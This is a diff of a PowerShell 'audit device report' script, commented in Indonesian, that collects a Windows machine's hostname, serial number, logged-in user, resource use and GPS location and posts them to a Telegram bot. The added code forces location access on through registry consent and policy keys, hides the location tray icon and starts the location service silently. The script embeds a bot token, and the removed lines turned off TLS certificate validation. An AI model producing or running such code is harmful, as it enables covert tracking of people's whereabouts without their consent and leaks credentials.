@@ -1,86 +1,63 @@
-# --- FIX SSL/TLS TRUST RELATIONSHIP ---
-# Baris ini memerintahkan PowerShell untuk menerima semua sertifikat SSL (Mengatasi error Trust Relationship)
-[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
-# --- KONFIGURASI TELEGRAM ---
+﻿# --- KONFIGURASI TELEGRAM ---
 $TelegramToken = "8717446156:AAGhWMtcY1HgArk-aVZCEXj1aco7E6FEBhY"
 $TelegramChatID = "1229343863"
 
-# --- [PRIVACY TOGGLE: ON] NYALAKAN AKSES LOKASI SEMENTARA ---
-try {
-    Set-Service -Name "lfsvc" -StartupType Manual -ErrorAction SilentlyContinue
-    Start-Service -Name "lfsvc" -ErrorAction SilentlyContinue
 
-    $ConsentPaths = @(
-        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location",
-        "HKCU:\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location"
-    )
-    foreach ($path in $ConsentPaths) {
-        if (-not (Test-Path $path)) { New-Item -Path $path -Force | Out-Null }
-        Set-ItemProperty -Path $path -Name "Value" -Value "Allow" -ErrorAction SilentlyContinue
-    }
+# --- PRIVACY & ENFORCEMENT (Diberi Try-Catch agar tidak error jika bukan Admin) ---
+try {
+    $RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Privacy"
+    if (-not (Test-Path $RegistryPath)) { New-Item -Path $RegistryPath -Force -ErrorAction SilentlyContinue }
+    Set-ItemProperty -Path $RegistryPath -Name "LocationIconStatus" -Value 0 -ErrorAction SilentlyContinue
     
-    $PrivPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Privacy"
-    if (-not (Test-Path $PrivPath)) { New-Item -Path $PrivPath -Force | Out-Null }
-    Set-ItemProperty -Path $PrivPath -Name "LocationIconStatus" -Value 0 -ErrorAction SilentlyContinue
-} catch {}
-
-# --- PENGUMPULAN DATA ---
-$Hostname = $env:COMPUTERNAME
-$SN = (Get-CimInstance Win32_Bios -ErrorAction SilentlyContinue).SerialNumber
-$User = if ($Expl = Get-CimInstance Win32_Process -Filter "Name='explorer.exe'") { (Invoke-CimMethod -InputObject $Expl[0] -MethodName GetOwner).User } else { $env:USERNAME }
-
-# 1. Resource Usage
-$CPU = [Math]::Round((Get-Counter '\Processor(_Total)\% Processor Time' -SampleInterval 1 -MaxSamples 1).CounterSamples.CookedValue, 1)
-$RAMUsage = [Math]::Round(((Get-CimInstance Win32_OperatingSystem).TotalVisibleMemorySize - (Get-CimInstance Win32_OperatingSystem).FreePhysicalMemory) / (Get-CimInstance Win32_OperatingSystem).TotalVisibleMemorySize * 100, 1)
-$DiskUsage = [Math]::Round((Get-Counter '\LogicalDisk(C:)\% Disk Time' -MaxSamples 1).CounterSamples.CookedValue, 1)
-if ($DiskUsage -gt 100) { $DiskUsage = 100 }
-$NetUsage = [Math]::Round(((Get-Counter '\Network Interface(*)\Bytes Total/sec' -ErrorAction SilentlyContinue).CounterSamples.CookedValue | Measure-Object -Sum).Sum / 1KB, 1)
-try { $GPUUsage = [Math]::Round(((Get-Counter '\GPU Engine(*)\Utilization Percentage' -ErrorAction SilentlyContinue).CounterSamples.CookedValue | Measure-Object -Sum).Sum, 1) } catch { $GPUUsage = 0 }
-
-# 2. Logika Baterai Health
-$BatteryString = "PC Desktop / (No Battery)"
-$ReportPath = "$env:TEMP\bat_audit.html"
-try {
-    powercfg /batteryreport /output $ReportPath | Out-Null
-    Start-Sleep -Seconds 2
-    if (Test-Path $ReportPath) {
-        $Html = Get-Content $ReportPath -Raw
-        $DMatch = [regex]::Match($Html, 'DESIGN CAPACITY.*?<td>([\d,.]+)\s*mWh')
-        $FMatch = [regex]::Match($Html, 'FULL CHARGE CAPACITY.*?<td>([\d,.]+)\s*mWh')
-        if ($DMatch.Success -and $FMatch.Success) {
-            $DVal = [int]($DMatch.Groups[1].Value -replace '[,.]', '')
-            $FVal = [int]($FMatch.Groups[1].Value -replace '[,.]', '')
-            $Health = [math]::Round(($FVal / $DVal) * 100, 1)
-            $BatteryString = "$Level ($Status)`n   └ Health: $Health% ($FVal / $DVal mWh)"
-        }
-        Remove-Item $ReportPath -Force -ErrorAction SilentlyContinue
-    }
-} catch { $BatteryString = "Error Reading" }
-
-# 3. Storage Status
-$DiskReport = ""
-$TargetDrives = "C:", "D:", "E:"
-
-foreach ($DriveLetter in $TargetDrives) {
-    try {
-        $Disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='$DriveLetter'" -ErrorAction SilentlyContinue
-        if ($Disk) {
-            $FreeGB = [Math]::Round($Disk.FreeSpace / 1GB, 1)
-            $TotalGB = [Math]::Round($Disk.Size / 1GB, 1)
-            $PercentFree = [Math]::Round(($Disk.FreeSpace / $Disk.Size) * 100, 1)
-            
-            # Menentukan Ikon berdasarkan sisa kapasitas
-            $Icon = if ($PercentFree -lt 10) { "🔴" } else { "🟢" }
-            $DiskReport += "$Icon *$DriveLetter* $FreeGB GB / $TotalGB GB ($PercentFree%)`n"
-        }
-    } catch {
-        # Jika drive tidak ada (misal laptop tidak punya D atau E), biarkan kosong
-    }
+    # Bagian HKLM biasanya gagal jika tidak "Run as Administrator"
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location" -Name "Value" -Value "Allow" -ErrorAction SilentlyContinue
+    
+    $PolicyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors"
+    if (-not (Test-Path $PolicyPath)) { New-Item -Path $PolicyPath -Force -ErrorAction SilentlyContinue }
+    Set-ItemProperty -Path $PolicyPath -Name "DisableLocation" -Value 0 -ErrorAction SilentlyContinue
+} catch {
+    # Abaikan error permission registry agar skrip tetap lanjut ke pengiriman lokasi
 }
 
-# 4. PM Status & Uptime
+# --- SELF-HEALING: Service Lokasi ---
+try {
+    $LocationService = Get-Service -Name "lfsvc" -ErrorAction SilentlyContinue
+    if ($LocationService -and $LocationService.Status -ne 'Running') { 
+        Start-Service -Name "lfsvc" -ErrorAction SilentlyContinue 
+    }
+} catch {}
+
+# --- CEK KONEKSI TELEGRAM ---
+function Test-TelegramAccess {
+    try {
+        $tcpClient = New-Object System.Net.Sockets.TcpClient
+        $connect = $tcpClient.BeginConnect("api.telegram.org", 443, $null, $null)
+        if ($connect.AsyncWaitHandle.WaitOne(2000, $false)) {
+            $tcpClient.EndConnect($connect); $tcpClient.Close(); return $true
+        }
+        return $false
+    } catch { return $false }
+}
+if (-not (Test-TelegramAccess)) { exit }
+
+# --- PENGUMPULAN DATA AUDIT ---
+$Hostname = $env:COMPUTERNAME
+$SN = (Get-CimInstance Win32_Bios -ErrorAction SilentlyContinue).SerialNumber
+
+# A. Windows Update
+try {
+    $WinUpdate = Get-CimInstance Win32_QuickFixEngineering | Sort-Object InstalledOn -Descending | Select-Object -First 1
+    $LastWinUpdate = if ($WinUpdate.InstalledOn) { $WinUpdate.InstalledOn.ToString("dd MMM yyyy") } else { "N/A" }
+} catch { $LastWinUpdate = "N/A" }
+
+# B. Defragment
+try {
+    $DefragLog = Get-WinEvent -FilterHashtable @{LogName='Application'; ID=258} -MaxEvents 1 -ErrorAction SilentlyContinue
+    $LastDefrag = if ($DefragLog) { $DefragLog.TimeCreated.ToString("dd MMM yyyy") } else { "N/A" }
+} catch { $LastDefrag = "N/A" }
+
+
+# C. Antivirus & Update Database (Final Cleanup)
 try {
     $AVQuery = Get-CimInstance -Namespace "root\SecurityCenter2" -Class "AntiVirusProduct" -ErrorAction SilentlyContinue
     
@@ -106,63 +83,146 @@ try {
 } catch { 
     $AVName = "Kaspersky Endpoint"; $LastAVUpdate = "Check App" 
 }
-$Uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
+
+# PEMBACAAN RESOURCE TASK MANAGER (SNAPSHOT) ---
+# CPU Usage (%)
+$CPU = [Math]::Round((Get-Counter '\Processor(_Total)\% Processor Time' -SampleInterval 1 -MaxSamples 1).CounterSamples.CookedValue, 1)
+
+# RAM Usage (%)
+$RAM = Get-CimInstance Win32_OperatingSystem
+$FreeRAM = $RAM.FreePhysicalMemory
+$TotalRAM = $RAM.TotalVisibleMemorySize
+$RAMUsage = [Math]::Round((($TotalRAM - $FreeRAM) / $TotalRAM) * 100, 1)
+
+# Disk Usage (%) - Waktu aktif disk C
+$DiskUsage = [Math]::Round((Get-Counter '\LogicalDisk(C:)\% Disk Time' -MaxSamples 1).CounterSamples.CookedValue, 1)
+if ($DiskUsage -gt 100) { $DiskUsage = 100 }
+
+# Tambahan: Kapasitas Baterai
+try {
+    $Battery = Get-CimInstance -ClassName Win32_Battery -ErrorAction SilentlyContinue
+    if ($Battery) {
+        $BatLevel = "$($Battery.EstimatedChargeRemaining)%"
+        $Status = if ($Battery.BatteryStatus -eq 2) { "🔌 Charging" } else { "🔋 Discharging" }
+        $BatteryString = "$BatLevel ($Status)"
+    } else { $BatteryString = "Desktop (No Battery)" }
+} catch { $BatteryString = "N/A" }
+
+# --- CEK KAPASITAS DISK (C, D, E) ---
+$DiskReport = ""
+$TargetDrives = "C:", "D:", "E:"
+
+foreach ($DriveLetter in $TargetDrives) {
+    try {
+        $Disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='$DriveLetter'" -ErrorAction SilentlyContinue
+        if ($Disk) {
+            $FreeGB = [Math]::Round($Disk.FreeSpace / 1GB, 1)
+            $TotalGB = [Math]::Round($Disk.Size / 1GB, 1)
+            $PercentFree = [Math]::Round(($Disk.FreeSpace / $Disk.Size) * 100, 1)
+            
+            # Menentukan Ikon berdasarkan sisa kapasitas
+            $Icon = if ($PercentFree -lt 10) { "🔴" } else { "🟢" }
+            $DiskReport += "$Icon *$DriveLetter* $FreeGB GB / $TotalGB GB ($PercentFree%)`n"
+        }
+    } catch {
+        # Jika drive tidak ada (misal laptop tidak punya D atau E), biarkan kosong
+    }
+}
+
+# Network Usage (Kbps)
+$Net = Get-Counter '\Network Interface(*)\Bytes Total/sec' -ErrorAction SilentlyContinue
+$NetUsage = [Math]::Round(($Net.CounterSamples.CookedValue | Measure-Object -Sum).Sum / 1KB, 1)
+
+# GPU Usage (%)
+try {
+    $GPU = (Get-Counter '\GPU Engine(*)\Utilization Percentage' -ErrorAction SilentlyContinue).CounterSamples.CookedValue | Measure-Object -Sum
+    $GPUUsage = [Math]::Round($GPU.Sum, 1)
+} catch { $GPUUsage = 0 }
+
+# Menghitung Uptime (Sudah berapa lama laptop menyala)
+$OS = Get-CimInstance Win32_OperatingSystem
+$Uptime = (Get-Date) - $OS.LastBootUpTime
 $UptimeString = "{0} Hari, {1} Jam, {2} Menit" -f $Uptime.Days, $Uptime.Hours, $Uptime.Minutes
 
-# 5. LOGIKA LOKASI
+# --- DATA LOKASI ---
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 Add-Type -AssemblyName System.Device -ErrorAction SilentlyContinue
 $Watcher = New-Object System.Device.Location.GeoCoordinateWatcher(1)
 $Watcher.Start()
-for ($i=0; $i -lt 30; $i++) { if ($Watcher.Position.Location.IsUnknown) { Start-Sleep -Milliseconds 500 } else { break } }
-$Loc = $Watcher.Position.Location
 
-if (!$Loc.IsUnknown -and $Loc.HorizontalAccuracy -gt 0) {
-    $Acc = [Math]::Round($Loc.HorizontalAccuracy, 1)
-    $Lat = $Loc.Latitude.ToString().Replace(",", "."); $Lon = $Loc.Longitude.ToString().Replace(",", ".")
-} else {
-    try {
-        $IpInfo = Invoke-RestMethod -Uri "http://ip-api.com/json/" -TimeoutSec 5
-        $Lat = $IpInfo.lat.ToString().Replace(",", "."); $Lon = $IpInfo.lon.ToString().Replace(",", "."); $Acc = "Approx (IP)"
-    } catch { $Acc = "N/A"; $Lat = "0"; $Lon = "0" }
-}
-$Watcher.Stop()
-
-# --- [PRIVACY TOGGLE: OFF] MATIKAN SEMUA AKSES LOKASI KEMBALI ---
-try {
-    Stop-Service -Name "lfsvc" -Force -ErrorAction SilentlyContinue
-    foreach ($path in $ConsentPaths) {
-        Set-ItemProperty -Path $path -Name "Value" -Value "Deny" -ErrorAction SilentlyContinue
+# Loop cerdas: Tunggu sampai akurasi < 150 meter atau maksimal tunggu 10 detik
+$MaxWait = 0
+while ($MaxWait -lt 100) { # 100 * 100ms = 10 detik
+    $Location = $Watcher.Position.Location
+    
+    # Jika sudah dapat akurasi yang cukup bagus, langsung keluar dari loop
+    if (-not $Location.IsUnknown -and $Location.HorizontalAccuracy -le 150 -and $Location.HorizontalAccuracy -ne 0) {
+        break
     }
-} catch {}
+    
+    Start-Sleep -Milliseconds 100
+    $MaxWait++
+}
 
-# --- PENYUSUNAN PESAN ---
+# --- DETEKSI USER AKTIF (Bypass NT AUTHORITY\SYSTEM) ---
+try {
+    # Mencari pemilik proses explorer.exe (User yang sedang login & melihat desktop)
+    $ExplorerProcess = Get-CimInstance Win32_Process -Filter "Name='explorer.exe'" -ErrorAction SilentlyContinue
+    if ($ExplorerProcess) {
+        $OwnerInfo = Invoke-CimMethod -InputObject $ExplorerProcess[0] -MethodName GetOwner -ErrorAction SilentlyContinue
+        $User = "$($OwnerInfo.User)" # Hasil: NamaUser saja
+        # Jika ingin menyertakan Domain: "$($OwnerInfo.Domain)\$($OwnerInfo.User)"
+    } else {
+        # Fallback jika tidak ada explorer yang jalan (misal di layar Lock Screen)
+        $User = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split("\")[-1]
+    }
+} catch {
+    $User = "Unknown"
+}
+
+$Location = $Watcher.Position.Location
 $Timestamp = Get-Date -Format "yyyy-MM-dd | HH:mm:ss"
-$MapsLink = "https://www.google.com/maps?q=$Lat,$Lon"
-$Message = "📍 *AUDIT DEVICE REPORT*`n" +
-           "━━━━━━━━━━━━━━━━━━`n" +
-           "💻 *Hostname:* $Hostname`n" +
-           "🔢 *Serial Number:* $SN`n" +
-           "👤 *User:* $User`n" +
-           "━━━━━━━━━━━━━━━━━━`n" +
-           "📊 *RESOURCE USAGE:*`n" +
-           "📟 *CPU:* $CPU % | ⚡ *RAM:* $RAMUsage %`n" +
-           "📁 *Disk:* $DiskUsage % | 🎨 *GPU:* $GPUUsage %`n" +
-           "🔋 *Battery:* $BatteryString`n" +
-           "📶 *Network:* $NetUsage Kbps`n" +
-           "⏱️ *Uptime:* $UptimeString`n" +
-           "━━━━━━━━━━━━━━━━━━`n" +
-           "💾 *SPACE STORAGE STATUS:*`n$DiskReport" +
-           "━━━━━━━━━━━━━━━━━━`n" +
-           "⚙️ *PM STATUS:*`n" +
-           "🛡️ *AV:* $AVName`n" +
-           "📅 *AV Update:* $(Get-Date -Format 'dd MMM yyyy')`n" +
-           "🔄 *Win Update:* $LastWinUpdate`n" +
-           "🧹 *Last Defrag:* $LastDefrag`n" +
-           "🎯 *Location Accuracy:* $Acc meter`n" +
-           "⏰ *Report Sent:* $Timestamp`n" +
-           "━━━━━━━━━━━━━━━━━━`n" +
-           "🔗 [Gmaps - Device Location]($MapsLink)"
 
-# --- KIRIM ---
-$Payload = @{ chat_id = $TelegramChatID; text = $Message; parse_mode = "Markdown" }
-Invoke-RestMethod -Uri "https://api.telegram.org/bot$($TelegramToken)/sendMessage" -Method Post -Body $Payload -TimeoutSec 15
+if (!$Location.IsUnknown) {
+    $Lat = $Location.Latitude.ToString().Replace(",", ".")
+    $Lon = $Location.Longitude.ToString().Replace(",", ".")
+    $Acc = [Math]::Round($Location.HorizontalAccuracy, 2)
+    $MapsLink = "https://www.google.com/maps?q=$Lat,$Lon"
+    
+    $Message = "📍 *AUDIT DEVICE REPORT*`n" +
+               "━━━━━━━━━━━━━━━━━━`n" +
+               "💻 *Hostname:* $Hostname`n" +
+               "🔢 *Serial Number:* $SN`n" +
+               "👤 *User:* $User`n" +
+               "━━━━━━━━━━━━━━━━━━`n" +
+               "📊 *RESOURCE USAGE:*`n" +
+               "📟 *CPU:* $CPU % `n" +
+               "⚡ *RAM:* $RAMUsage %`n" +
+               "📁 *Disk:* $DiskUsage %`n" +
+               "🔋 *Battery:* $BatteryString`n" +
+               "📶 *Network:* $NetUsage Kbps`n" +
+               "🎨 *GPU:* $GPUUsage %`n" +
+               "⏱️ *Uptime:* $UptimeString`n" +
+               "━━━━━━━━━━━━━━━━━━`n" +
+               "💾 *STORAGE STATUS:*`n" +
+                $DiskReport +
+               "━━━━━━━━━━━━━━━━━━`n" +
+               "⚙️ *PM STATUS:*`n" +
+               "🛡️ *AV:* $AVName`n" +
+               "📅 *AV Update:* $LastAVUpdate`n" +
+               "🔄 *Win Update:* $LastWinUpdate`n" +
+               "🧹 *Last Defrag:* $LastDefrag`n" +
+               "🎯 *Location Accuracy:* $($Acc) meter`n" +
+               "⏰ *Report Sent:* $Timestamp`n" +
+               "━━━━━━━━━━━━━━━━━━`n" +
+               "🔗 [Device location]($MapsLink)"
+
+    try {
+        $Payload = @{ chat_id = $TelegramChatID; text = $Message; parse_mode = "Markdown" }
+        Invoke-RestMethod -Uri "https://api.telegram.org/bot$($TelegramToken)/sendMessage" -Method Post -Body $Payload -TimeoutSec 5
+    } catch {
+        "[$Timestamp] Telegram Send Error" | Out-File -FilePath $LogFile -Append
+    }
+}
+
+$Watcher.Stop()
